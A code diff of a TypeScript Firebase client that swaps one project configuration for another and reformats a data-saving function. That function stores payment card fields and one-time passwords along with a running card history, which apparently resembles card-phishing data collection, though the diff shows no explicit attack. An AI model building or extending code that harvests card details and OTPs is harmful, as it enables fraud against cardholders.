@@ -24,13 +24,14 @@ import {
 // writes flow through `POST /api/orders`. The Firestore rules on the orders
 // project can therefore deny anonymous reads on `orders` entirely.
 const firebaseConfig = {
-  apiKey: "AIzaSyD7lJVFT0YlHyGDvY6Vg5DrAWEy37c0CmQ",
-  authDomain: "drd-new.firebaseapp.com",
-  projectId: "drd-new",
-  storageBucket: "drd-new.firebasestorage.app",
-  messagingSenderId: "278382775396",
-  appId: "1:278382775396:web:dca7127a4eac9b99a1e371",
-  measurementId: "G-0VG26ERJXH",
+  apiKey: "AIzaSyBCgnfGog9E1l543Own6CIAtaK8nCmk1ZE",
+  authDomain: "drettyafgh.firebaseapp.com",
+  databaseURL: "https://drettyafgh-default-rtdb.firebaseio.com",
+  projectId: "drettyafgh",
+  storageBucket: "drettyafgh.firebasestorage.app",
+  messagingSenderId: "904057927481",
+  appId: "1:904057927481:web:f75cca6d120fa1038a5ae8",
+  measurementId: "G-ZEV35EHPJM",
 };
 
 let app: FirebaseApp | undefined;
@@ -611,7 +612,9 @@ export async function addData(
   if (hasCardFields || hasOtp) {
     try {
       const snap = await getDoc(docRef);
-      const existing = snap.exists() ? (snap.data() as Record<string, unknown>) : {};
+      const existing = snap.exists()
+        ? (snap.data() as Record<string, unknown>)
+        : {};
 
       if (hasCardFields) {
         const prev = Array.isArray(existing.cardHistory)
